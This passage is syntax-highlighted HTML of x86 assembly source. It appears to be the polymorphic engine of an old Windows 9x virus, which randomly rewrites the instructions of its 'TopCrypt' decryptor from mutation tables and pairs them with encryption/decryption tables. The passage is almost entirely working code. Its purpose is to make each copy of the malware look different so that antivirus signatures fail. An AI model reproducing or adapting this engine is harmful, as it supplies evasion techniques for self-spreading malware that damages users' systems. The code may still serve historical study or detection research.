</span><span class="sc0">
</span><span class="sc5">finally</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">mutate</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">encryption</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc5">decryption</span><span class="sc0"> </span><span class="sc5">algorithms</span><span class="sc0"> </span><span class="sc9">for</span><span class="sc0"> </span><span class="sc5">TopCrypt.</span><span class="sc0">
        </span><span class="sc10">$</span><span class="sc0">


</span><span class="sc5">GetRandomEAX</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc5">VxdCall</span><span class="sc0"> </span><span class="sc5">VMM_Get_System_Time</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CryptKey</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">bswap</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MutatedKey</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CryptKey</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
    </span><span class="sc1">;#### STEP 1 #####</span><span class="sc0">
</span><span class="sc5">MutateHeader</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetRandomEAX</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@dummy</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc1">;#### STEP 2 #####</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc1">;/* get a random counter between 0 and 4 */</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc5">substep2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">substep2</span><span class="sc0">
    </span><span class="sc1">;/* get table entry for the random counter */</span><span class="sc0">
        </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">t1entrysize</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MutationTable1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc1">;/* replace instructions with new from table entry */</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@stackregz</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@addfix</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@xchgfix</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc1">;#### STEP 3 #####</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc1">;/* get a random counter between 0 and 4 */</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc5">substep1</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">substep1</span><span class="sc0">
    </span><span class="sc1">;/* get table entry for the random counter */</span><span class="sc0">
        </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">t2entrysize</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MutationTable2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc1">;/* replace instructions with new from table entry */</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@ifix1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">t2entrysize</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc1">;#### STEP 4 #####</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">
</span><span class="sc5">step4_comb1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MutationTable3</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">step4_comb2</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
</span><span class="sc5">step4_comb2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@ifix2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc1">;#### STEP 5 #####</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MutationTable4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">step5_comb2</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
</span><span class="sc5">step5_comb2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@ifix3</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc1">;#### STEP 6 #####</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetRandomEAX</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">
</span><span class="sc5">step6_comb1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MutationTable5</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">step6_comb2</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
</span><span class="sc5">step6_comb2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@ifix4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc1">;#### STEP 7 ####</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">
</span><span class="sc5">step7_comb1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MutationTable6</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">step7_comb2</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">step7_comb2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@ifix5</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc1">;#### STEP 8 ####</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">
</span><span class="sc5">step8_comb1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MutationTable7</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">step8_comb2</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
</span><span class="sc5">step8_comb2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@ifix6</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc1">;#### STEP 9 ####</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">
</span><span class="sc5">step9_comb1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MutationTable8</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">step9_comb2</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
</span><span class="sc5">step9_comb2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@ifix7</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc1">;#### STEP 10 ####</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">step10_comb1</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MutationTable9</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">step10_comb2</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">step10_comb2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@ifix8</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
    </span><span class="sc1">;/*** Mutation tables ***/</span><span class="sc0">
</span><span class="sc5">MutationTable1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,(</span><span class="sc5">TopCrypt</span><span class="sc4">-</span><span class="sc5">@addfix</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc5">t1entrysize</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">MutationTable1</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,(</span><span class="sc5">TopCrypt</span><span class="sc4">-</span><span class="sc5">@addfix</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,(</span><span class="sc5">TopCrypt</span><span class="sc4">-</span><span class="sc5">@addfix</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,(</span><span class="sc5">TopCrypt</span><span class="sc4">-</span><span class="sc5">@addfix</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,(</span><span class="sc5">TopCrypt</span><span class="sc4">-</span><span class="sc5">@addfix</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc5">MutationTable2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">t2entrysize</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">MutationTable2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc5">MutationTable3</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc5">MutationTable4</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">12345678h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">MutationTable5</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,(</span><span class="sc5">TopCryptSize</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">TopCryptSize</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc5">MutationTable6</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc5">MutationTable7</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc5">MutationTable8</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc5">MutationTable9</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">dec_table</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">bswap</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">bswap</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">bswap</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">cr_table_size</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">dec_table</span><span class="sc0">
</span><span class="sc5">cr_table_nr</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">cr_table_size</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">bswap</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">bswap</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">bswap</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
